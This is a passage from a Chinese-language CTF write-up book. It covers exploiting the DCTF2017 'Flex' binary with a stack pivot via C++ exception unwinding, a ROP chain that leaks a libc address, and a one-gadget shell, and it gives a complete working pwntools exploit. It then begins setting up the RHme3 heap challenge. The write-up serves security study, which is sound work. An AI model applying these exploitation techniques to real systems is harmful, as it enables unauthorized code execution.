l_dh] ; 取出读入字符
1021
6.1.8 pwn DCTF2017 Flex
| | |: 0x00400eeb 8802 mov byte [rdx], al
; 将读入字符存放到 [rdx]
| | |: 0x00400eed 8345f401 add dword [local_ch],
1 ; local_ch += 1
| | |`= 0x00400ef3 8b45e4 mov eax, dword [local
_1ch]
| | 0x00400ef6 83e801 sub eax, 1
| | 0x00400ef9 89c2 mov edx, eax
| | 0x00400efb 488b45e8 mov rax, qword [local
_18h]
| | 0x00400eff 4801d0 add rax, rdx
; '('
| | 0x00400f02 c60000 mov byte [rax], 0
| | 0x00400f05 8b45f4 mov eax, dword [local
_ch]
| | ; JMP XREF from 0x00400edb (sub.read_e76)
| `----> 0x00400f08 488b4df8 mov rcx, qword [local
_8h] ; 读完字符串，跳出循环
| 0x00400f0c 6448330c2528. xor rcx, qword fs:[0x
28]
| ,= 0x00400f1c c9 leave
\ 0x00400f1d c3 ret
分析完了，接下来就写 exp 吧。
漏洞利用
stack pivot
在 0x004012b4 下断点，以检查溢出点：
1022
6.1.8 pwn DCTF2017 Flex
gdb-peda$ x/s $rbp
0x7fffffffe3f0: "5A%KA%gA%6A%"
gdb-peda$ pattern_offset 5A%KA%gA%6A%
5A%KA%gA%6A% found at offset: 288
所以缓冲区的长度为 288 / 8 = 36 。利用缓冲区溢出覆盖掉 rbp，在异常处理
过程中，unwind 例程向上一级一级地找异常处理函数，然后恢复相关数据，这样
就将栈转移到了新地址：
# stack pivot
payload_1 = "AAAAAAAA" * 36
payload_1 += p64(pivote_addr)
payload_1 += p64(unwind_addr)
unwind_addr 必须是调用函数里的一个地址，这样抛出的异常才能被调用函数内的
异常处理函数 catch。
get puts address
异常处理函数结束后，执行下面两句：
| `--> 0x0040155f c9 leave
\ 0x00401560 c3 ret
; ret 到 payload_2
通常情况下我们构造 rop 调用 read() 读入 one-gadget 来获得 shell，但可用的
gadget 只能控制 rdi 和 rsi，而不能控制 rdx。所以必须通过函数 sub.read_f1e
来做到这一点。
$ ropgadget --binary flex --only "pop|ret"
...
0x00000000004044d3 : pop rdi ; ret
0x00000000004044d1 : pop rsi ; pop r15 ; ret
1023
6.1.8 pwn DCTF2017 Flex
[0x00400d80]> pdf @ sub.read_f1e
/ (fcn) sub.read_f1e 39
| sub.read_f1e ();
| ; var int local_10h @ rbp-0x10
| ; var int local_8h @ rbp-0x8
| ; CALL XREF from 0x004012e3 (sub.FlexMD5_brutefor
ce_tool_V0.1_148)
| 0x00400f1e 55 push rbp
| 0x00400f1f 4889e5 mov rbp, rsp
| 0x00400f22 4883ec10 sub rsp, 0x10
| 0x00400f26 48897df8 mov qword [local_8h],
rdi
| 0x00400f2a 488975f0 mov qword [local_10h]
, rsi
| 0x00400f2e 488b55f0 mov rdx, qword [local
_10h] ; rdx = 传入的 rsi
| 0x00400f32 488b45f8 mov rax, qword [local
_8h]
| 0x00400f36 4889c6 mov rsi, rax
; rsi = 传入的 rdi
| 0x00400f39 bf00000000 mov edi, 0
; fildes = 0
| 0x00400f3e e8adfcffff call sym.imp.read
; ssize_t read(int fildes, void *buf, size_t nbyte)
| 0x00400f43 c9 leave
\ 0x00400f44 c3 ret
构造 paylode_2 打印出 puts 的地址，并调用 read_f1e 读入 payload_3 到
pivote_addr + 0x50 的位置：
1024
6.1.8 pwn DCTF2017 Flex
# get puts address
payload_2 = "AAAAAAAA"
payload_2 += p64(pop_rdi)
payload_2 += p64(puts_got)
payload_2 += p64(puts_plt)
payload_2 += p64(pop_rdi)
payload_2 += p64(pivote_addr + 0x50)
payload_2 += p64(pop_rsi_r15)
payload_2 += p64(8)
payload_2 += "AAAAAAAA"
payload_2 += p64(read_f1e)
io.sendline(payload_2)
io.recvuntil("pattern:\n")
puts_addr = io.recvuntil("\n")[:-1].ljust(8,"\x00")
puts_addr = u64(puts_addr)
get shell
找到 libc 的 do_system 函数里的 one-gadget 地址为 0x00041ee7 ：
| 0x00041ee7 488b056aff36. mov rax, qword [0x003
b1e58] ; [0x3b1e58:8]=0
| 0x00041eee 488d3d409313. lea rdi, str._bin_sh
; 0x17b235 ; "/bin/sh"
| 0x00041ef5 c70521253700. mov dword [obj.lock_4
], 0 ; [0x3b4420:4]=0
| 0x00041eff c7051b253700. mov dword [obj.sa_ref
cntr], 0 ; [0x3b4424:4]=0
| 0x00041f09 488d742430 lea rsi, [local_30h]
; sym.lm_cache ; 0x30
| 0x00041f0e 488b10 mov rdx, qword [rax]
| 0x00041f11 67e8c9260800 call sym.execve
通过泄露出的 puts 地址，计算符号偏移得到 one-gadget 地址，构造 payload_3：
1025
6.1.8 pwn DCTF2017 Flex
libc_base = puts_addr - libc.symbols['puts']
one_gadget = libc_base + 0x00041ee7
# get shell
payload_3 = p64(one_gadget)
Bingo!!!
$ python2 exp.py
[+] Opening connection to 127.0.0.1 on port 10001: Done
[*] Switching to interactive mode
$ whoami
firmy
exploit
完整的 exp 如下：
from pwn import *
io = remote('127.0.0.1', 10001)
libc = ELF('/usr/lib/libc-2.26.so')
io.recvuntil("option:\n")
io.sendline("1")
io.recvuntil("(yes/No)")
io.sendline("No")
io.recvuntil("(yes/No)")
io.sendline("yes")
io.recvuntil("length:")
io.sendline('-3')
io.recvuntil("charset:")
puts_plt = 0x00400bD0
puts_got = 0x00606020
read_f1e = 0x00400f1e
pop_rdi = 0x004044d3 # pop rdi ; ret
1026
6.1.8 pwn DCTF2017 Flex
pop_rsi_r15 = 0x004044d1 # pop rsi ; pop r15 ; ret
pivote_addr = 0x6061C0
unwind_addr = 0x00401509 # make sure unwind can find the catc
h routine
# stack pivot
payload_1 = "AAAAAAAA" * 36
payload_1 += p64(pivote_addr)
payload_1 += p64(unwind_addr)
io.sendline(payload_1)
io.recvuntil("\n")
# get puts address
payload_2 = "AAAAAAAA" # fake ebp
payload_2 += p64(pop_rdi)
payload_2 += p64(puts_got)
payload_2 += p64(puts_plt)
payload_2 += p64(pop_rdi)
payload_2 += p64(pivote_addr + 0x50)
payload_2 += p64(pop_rsi_r15)
payload_2 += p64(8)
payload_2 += "AAAAAAAA"
payload_2 += p64(read_f1e)
io.sendline(payload_2)
io.recvuntil("pattern:\n")
puts_addr = io.recvuntil("\n")[:-1].ljust(8,"\x00")
puts_addr = u64(puts_addr)
libc_base = puts_addr - libc.symbols['puts']
one_gadget = libc_base + 0x00041ee7
# get shell
payload_3 = p64(one_gadget)
io.sendline(payload_3)
io.interactive()
1027
6.1.8 pwn DCTF2017 Flex
最后建议读者自己多调试几遍，以加深对异常处理机制的理解。
参考资料
Shanghai-DCTF-2017 线下攻防Pwn题
c++ 异常处理（1）
C++异常机制的实现方式和开销分析
1028
6.1.9 pwn RHme3 Exploitation
6.1.9 pwn RHme3 Exploitation
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
这个题目给出了二进制文件和 libc。
$ file main.bin
main.bin: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), d
ynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for
GNU/Linux 2.6.32, BuildID[sha1]=ec9db5ec0b8ad99b3b9b1b3b57e5536d
1c615c8e, not stripped
$ checksec -f main.bin
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Partial RELRO Canary found NX enabled No PIE
No RPATH No RUNPATH Yes 0 10 main.bin
$ strings libc-2.23.so | grep "GNU C"
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu9) stable release versio
n 2.23, by Roland McGrath et al.
Compiled by GNU CC version 5.4.0 20160609.
64 位程序，保护措施除了 PIE 都开启了。
但其实这个程序并不能运行，它是一个线下赛的题目，会对做一些环境检查和处
理，直接 nop 掉就好了：
1029
6.1.9 pwn RHme3 Exploitation
| 0x004021ad bf18264000 mov edi, 0x402618
| 0x004021b2 e87ceeffff call sym.background_p
rocess
| 0x004021b7 bf39050000 mov edi, 0x539
; 1337
| 0x004021bc e85eefffff call sym.serve_foreve
r
| 0x004021c1 8945f8 mov dword [local_8h],
eax
| 0x004021c4 8b45f8 mov eax, dword [local
_8h]
| 0x004021c7 89c7 mov edi, eax
| 0x004021c9 e8c6f0ffff call sym.set_io
$ python2 -c 'print "90"*33' > nop.txt
[0x00400ec0]> s 0x004021ad
[0x004021ad]> cat ./nop.txt
9090909090909090909090909090909090909090909090909090909090909090
90
[0x004021ad]> wxf ./nop.txt
最后把它运行起来：
$ socat tcp4-listen:10001,reuseaddr,fork exec:"env LD_PRELOAD=./
libc-2.23.so ./main.elf" &
题目解析
玩一下，一看就是堆利用的题目：
1030
6.1.9 pwn RHme3 Exploitation
$ ./main.elf
Welcome to your TeamManager (TM)!
0.- Exit
1.- Add player
2.- Remove player
3.- Select player
4.- Edit player
5.- Show player
6.- Show team
Your choice:
程序就是添加、删除、编辑和显示球员信息。但要注意的是在编辑和显示球员前，
需要先选择球员，这一点很重要。
添加两个球员看看：
Your choice: 1
Found free slot: 0
Enter player name: aaaa
Enter attack points: 1
Enter defense points: 2
Enter speed: 3
Enter precision: 4
0.- Exit
1.- Add player
2.- Remove player
3.- Select player
4.- Edit player
5.- Show player
6.- Show team
Your choice: 1
Found free slot: 1
Enter player name: bbbb
Enter attack points: 5
Enter defense points: 6
Enter speed: 7
Enter precision: 8
1031
6.1.9 pwn RHme3 Exploitation
试着选中第一个球员，然后删除它：
Your choice: 3
Enter index: 0
Player selected!